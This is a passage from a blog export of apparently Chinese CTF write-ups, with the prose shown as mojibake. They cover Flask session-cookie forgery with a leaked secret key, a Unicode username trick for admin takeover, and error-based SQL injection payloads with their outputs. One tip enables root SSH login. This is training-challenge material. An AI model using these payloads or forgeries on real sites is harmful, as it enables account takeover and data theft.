class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flaskæ˜¯ç”¨pythonå†™çš„webæ¡†æ¶ï¼Œsessionä»¥cookieå½¢å¼å­˜åœ¨å®¢æˆ·ç«¯</p><p>æ¥ä¸‹æ¥è§£ç ï¼Œå†ä¼ªé€ session</p><p><img src="https://z3.ax1x.com/2021/03/29/c9EmwD.png" alt="c9EmwD.png"></p><p>æ‹¿åˆ°session</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">sessionï¼š.eJxFUM9rwjAU_lfGO3toQ70IXkatOHgvVNKGl4s4rbZp4qBV1Ij_-4Ib2_n7_T1gcxiasYXZebg0E9h0e5g94O0TZoCWU6nLK_rqjp4DWbKsyzvZPpOKnNRFT2IhZF5luOSb8ZyQLjyFtpXKucgLMi981AQMq4zVUVDeT03Od7YrQdZZ4xeB9fqHvzQew75F9eHJVkEuyykpvKEvE6ljdlhELSYm7wWHdWvUTlDYd6iqOTwnsBuHw-b81Tenvwmka4e6cLFChmqXGBXtremkNg5trGPfLfuiN7ZMWVWJ0euOr_OXXee3x-b_DFFn9S9y2voIQAoTuIzN8PoM0gSe3-wTbLg.YGAkfw.j_uEzvi-2vEKxpp7Xzgj-Iyw1bc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿˜éœ€è¦SECRET_KEY</p><p><code>config.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'ckj123'</span>    SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:adsl1234@db:3306/test'</span>    SQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">SECRET_KEY</span><span class="token punctuation">:</span><span class="token header-value">ckj123</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è„šæœ¬ï¼š<a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder</a></p><p>è·‘ä¸€ä¸‹ï¼Œå¾—åˆ°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python flask_session_cookie_manager3<span class="token punctuation">.</span>py decode <span class="token operator">-</span>s ckj123 <span class="token operator">-</span>c <span class="token punctuation">.</span>eJxFUMFqwkAQ_ZUyZw9GzSXgQUgTFGZCwsZl9yLWxmQnuylERV3x37u10B4ew_B4b968B<span class="token operator">-</span>yOY3PqIDmPl2YCO_MJyQPePiAB5PJOEqeK3<span class="token operator">-</span>MiVbGSG4Mz6khsGblzStYzdFWHYhX_TO20wYBCVJbk<span class="token operator">-</span>oq5iimtWIn<span class="token operator">-</span>hrwOaO_kNlaJ4CMzq7iOtMuc8ngrpO606KyWlS0kOeJyXqSrK84yR6maY54Z8kEXNMQHrzjcyMPubY<span class="token operator">-</span><span class="token operator">-</span>XMJzAofTeNydv_pm<span class="token operator">-</span>HuB0nqBvJoG2UJLddOcGS23PabWkNQOfe9JtPcir2NiHaJlFsvly864fdv8lzFsBt3<span class="token operator">-</span>MsPeBQIimMDl1IyvziCawvMb0RFtXA<span class="token punctuation">.</span>YGBYaw<span class="token punctuation">.</span>SFJ0fvQ_rtos<span class="token operator">-</span>TSz52cCzIIkQVY<span class="token punctuation">{</span><span class="token string">'_fresh'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'_id'</span><span class="token punctuation">:</span> <span class="token string">b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34'</span><span class="token punctuation">,</span> <span class="token string">'csrf_token'</span><span class="token punctuation">:</span> <span class="token string">b'458204258ef1f1beed09b5ff3935828e966ea1e1'</span><span class="token punctuation">,</span> <span class="token string">'image'</span><span class="token punctuation">:</span> <span class="token string">b'2rgf'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'user_id'</span><span class="token punctuation">:</span> <span class="token string">'10'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å°†<code>name</code>çš„å€¼æ”¹ä¸º<code>admin</code>,ç¼–ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python flask3<span class="token punctuation">.</span>py encode <span class="token operator">-</span>s ckj123 <span class="token operator">-</span>t <span class="token string">"{'_fresh': True, '_id': b'2425c4b19869abb3ca55c28fae62da1092daffb2fb94e5b00f944ca912212826bea2b1aeb55fafc319fae8eede9cf6478003af4670ab72b255673b4e4bb39d34', 'csrf_token': b'458204258ef1f1beed09b5ff3935828e966ea1e1', 'image': b'2rgf', 'name': 'admin', 'user_id': '10'}"</span><span class="token punctuation">.</span>eJxFUMuKwkAQ_JWlzx7iIxfBg5BNUOgOCROHmYv4iMl0ZrIQFXXEf99ZF3YPRdMUVV1dT9iehvrcwvwyXOsRbM0R5k_42MMckIsHSYwUf8Z5omIl1wYn1JLYMHLrlKwm6MoWxTL<span class="token operator">-</span>mdppgwG5KC3J1Q0zFVNSshLdHXkV0DzIra0SwUemVnE11i51yuM9l7rVorValjaX5IiLaZ4sbzhJHSVqillqyAdd0BAfvOJwIwu7tx36YgGvERzOw2l7<span class="token operator">-</span>erq_u8FSqoZ8jIKspmW6q45NVpuOkysIakd<span class="token operator">-</span>s6TaB55VsXEOkRLLRaLt51xu6b<span class="token operator">-</span>L6Nf97r5ZfqdCwTsjs70MILruR7evcE4gtc3l5pvNA<span class="token punctuation">.</span>YGBhyg<span class="token punctuation">.</span>8mFsYTGotorfD6H7bsHdSTnxKQ4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åç”¨burpæŠ“åŒ…ï¼Œä¼ å…¥ä¿®æ”¹çš„sessionï¼Œå¾—åˆ°flag</p><p><img src="https://z3.ax1x.com/2021/03/29/c9EnTe.png" alt="c9EnTe.png"></p><h4 id="Unicodeæ¬ºéª—"><a href="#Unicodeæ¬ºéª—" class="headerlink" title="Unicodeæ¬ºéª—"></a>Unicodeæ¬ºéª—</h4><p>åˆ©ç”¨è§£ç æœºåˆ¶ï¼Œä¼ å…¥ä¸€ä¸ªéé¢„æœŸçš„å€¼å¾—åˆ°é¢„æœŸçš„ç»“æœ</p><p>å¼•ç”¨ä¸Šé¢<code>routes.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™å‡ ä¸ªæ¨¡å—ä¸­éƒ½è°ƒç”¨äº†<code>nodeprep.prepare</code>è¿™ä¸ªå‡½æ•°</p><p>æŸ¥é˜…èµ„æ–™</p><p><code>nodeprep.prepare</code>è¿™ä¸ªå‡½æ•°ä¼šæŠŠå¤§å†™è½¬æ¢ä¸ºå°å†™ å¹¶ä¸”ä¼šåšå¦‚ä¸‹è½¬æ¢<br>å‡å¦‚æœ‰ä¸€ä¸ª<code>á´¬</code>å­—ç¬¦ ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°æ—¶ä¼šé€ æˆ<code>á´¬-&gt;A</code>ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨æ—¶ä¼š<code>A-&gt;a</code><br>æ‰€ä»¥æ€è·¯å°±æ˜¯ æˆ‘ä»¬æ³¨å†Œä¸€ä¸ª<code>á´¬dmin</code>è´¦å· æ­¤æ—¶ç¬¬ä¸€æ¬¡è°ƒç”¨<code>nodeprep.prepare</code> è´¦å·å˜ä¸º<br><code>Admin</code>,åœ¨ä¿®æ”¹å¯†ç ï¼Œä¼šå†æ¬¡è°ƒç”¨<code>nodeprep.prepare</code>,è¿™æ˜¯å°±å˜æˆäº†<code>admin</code></p><p>å†ç”¨æ”¹çš„å¯†ç ç™»å½•adminå°±æˆåŠŸäº†</p><p><img src="https://z3.ax1x.com/2021/03/29/c9Er60.png" alt="c9Er60.png"></p><p><img src="https://z3.ax1x.com/2021/03/29/c9Eg7F.png" alt="c9Eg7F.png"><img src="https://z3.ax1x.com/2021/03/29/c9ERk4.png" alt="c9ERk4.png"></p><p><img src="https://z3.ax1x.com/2021/03/29/c9Efh9.png" alt="c9Efh9.png"></p><p><img src="https://z3.ax1x.com/2021/03/29/c9E4pR.png" alt="c9E4pR.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordå…³é—­é¦–å­—æ¯è‡ªåŠ¨å¤§å†™</title>
      <link href="/2021/03/24/word-guan-bi-shou-zi-mu-zi-dong-da-xie/"/>
      <url>/2021/03/24/word-guan-bi-shou-zi-mu-zi-dong-da-xie/</url>
      
        <content type="html"><![CDATA[<p>ç‚¹å‡»æ–‡ä»¶<img src="https://z3.ax1x.com/2021/03/24/6bPD2t.png" alt="6bPD2t.png">ç‚¹å‡»é€‰é¡¹</p><p><img src="https://z3.ax1x.com/2021/03/24/6bPRaQ.png" alt="6bPRaQ.png"></p><p>ç‚¹å‡»æ ¡å¯¹</p><p><img src="https://z3.ax1x.com/2021/03/24/6bPhPs.png" alt="6bPhPs.png"></p><p>ç‚¹å‡»è‡ªåŠ¨æ›´æ­£é€‰é¡¹</p><p><img src="https://z3.ax1x.com/2021/03/24/6bPTMV.png" alt="6bPTMV.png"></p><p>æ¬§æ‹‰</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npmæ¢æº</title>
      <link href="/2021/03/22/npm-huan-yuan/"/>
      <url>/2021/03/22/npm-huan-yuan/</url>
      
        <content type="html"><![CDATA[<h2 id="npmæ¢æº"><a href="#npmæ¢æº" class="headerlink" title="npmæ¢æº"></a>npmæ¢æº</h2><p>ä¸´æ—¶æº</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">åœ¨å®‰è£…æ—¶å€™ä¸´æ—¶æŒ‡å®š$ <span class="token function">npm</span> <span class="token parameter variable">--registry</span> http://registry.cnpmjs.org install/info express<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŒä¹…æº</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ°¸ä¹…ä¿®æ”¹é•œåƒæº</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#æŸ¥çœ‹ npm é…ç½®</span>$ <span class="token function">npm</span> config list<span class="token comment"># å…¶ä»–æŸ¥çœ‹é…ç½®çš„æ–¹å¼</span>$ <span class="token function">npm</span> config get globalconfig$ <span class="token function">npm</span> config <span class="token function">ls</span> <span class="token parameter variable">-l</span>æ‰¾åˆ°å¹¶æ‰“å¼€é…ç½®æ–‡ä»¶ï¼š~/.npmrcå†™å…¥é…ç½®ï¼šregistry<span class="token operator">=</span>https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éªŒè¯è®¾ç½®æ˜¯å¦æˆåŠŸ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config get registry<span class="token comment"># OR</span><span class="token function">npm</span> info express<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ·˜å®npmé•œåƒ</p><ul><li>æœç´¢åœ°å€ï¼š<a href="http://npm.taobao.org/">http://npm.taobao.org/</a></li><li>registryåœ°å€ï¼š<a href="http://registry.npm.taobao.org/">http://registry.npm.taobao.org/</a></li></ul><p>cnpmjsé•œåƒ</p><ul><li>æœç´¢åœ°å€ï¼š<a href="http://cnpmjs.org/">http://cnpmjs.org/</a></li><li>registryåœ°å€ï¼š<a href="http://r.cnpmjs.org/">http://r.cnpmjs.org/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sshæ‹’ç»è¿æ¥</title>
      <link href="/2021/03/21/ssh-ju-jue-lian-jie/"/>
      <url>/2021/03/21/ssh-ju-jue-lian-jie/</url>
      
        <content type="html"><![CDATA[<ol><li>sudo vi /etc/ssh/sshd_config  å°†PermitRootLoginä¿®æ”¹ä¸ºyes</li><li>sudo /etc/init.d/ssh restarté‡å¯åŠ¨äº†sshdæœåŠ¡</li></ol>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 HardSQL</title>
      <link href="/2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/"/>
      <url>/2021/03/17/ji-ke-da-tiao-zhan-2019-hardsql/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€é¡µé¢ï¼Œè¿˜æ˜¯æ³¨å…¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‡èƒ½å¯†ç ä¸è¡Œï¼Œå¹¶ä¸”ä¸€ç›´æ˜¯ç›¸åŒçš„è¿”å›ä¿¡æ¯ï¼Œè¢«è¿‡æ»¤äº†å°±ä¼šæ˜¾ç¤ºè¿™ä¸ª</p><p><img src="https://s3.ax1x.com/2021/03/18/6gZkFO.png" alt="6gZkFO.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin'<span class="token operator">&amp;</span>password<span class="token operator">=</span>password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gZZSH.png" alt="6gZZSH.png"></p><p>æŠ¥é”™å¯ä»¥æŠ¥é”™æ³¨å…¥</p><p>æ„é€ payload,è¿™é‡Œè¿˜è¿‡æ»¤äº†ç©ºæ ¼(æ‹¬å·ç»•è¿‡)</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23&amp;password=1or?username=admin'</span><span class="token operator">or</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>XPATH syntax error: <span class="token string">'~geek~'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>H4rDsq1<span class="token operator">~</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="token string">')),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token operator">~</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>flag{ee2d297b<span class="token operator">-</span>ca3d<span class="token operator">-</span><span class="token number">4</span>d9e<span class="token operator">-</span><span class="token number">9</span>c8a<span class="token operator">-</span>d2'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>flagæ²¡å…¨éƒ¨è¾“å‡ºï¼Œå¤§ç¬‘.gif</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>admin<span class="token string">'or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=1XPATH syntax error: '</span><span class="token operator">~</span>b<span class="token operator">-</span>ca3d<span class="token operator">-</span><span class="token number">4</span>d9e<span class="token operator">-</span><span class="token number">9</span>c8a<span class="token operator">-</span>d23113610a22}<span class="token operator">~</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_æ–°ç”Ÿèµ› BackupFile</title>
      <link href="/2021/03/09/actf2020-xin-sheng-sai-backupfile/"/>
      <url>/2021/03/09/actf2020-xin-sheng-sai-backupfile/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>æ‰«æç›®å½•ï¼Œä¸‹è½½index.php.bak(è¿™å°±æ˜¯å¤‡ä»½æ–‡ä»¶)<img src="https://s3.ax1x.com/2021/03/09/68T7AH.png" alt="68T7AH.png"><code>index.php.bak</code>ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string 